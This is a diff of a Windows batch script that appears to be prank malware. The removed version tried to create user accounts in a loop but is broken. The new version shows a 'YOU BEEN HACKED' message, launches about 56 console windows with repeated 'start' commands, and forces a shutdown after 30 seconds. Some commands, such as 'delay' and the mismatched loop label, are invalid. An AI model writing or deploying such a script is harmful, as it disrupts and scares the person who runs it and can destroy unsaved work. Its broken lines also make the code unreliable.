@@ -1,4 +1,62 @@
-@echo off
-:xnet
-user %random% /add
-goto x
+@echo off 
+msg * YOU BEEN HACKED
+delay 2000
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+shutdown /s /t 30 /c "BYE BYE !!!!!!!!!!!!!!!!!!!!!!!!!"
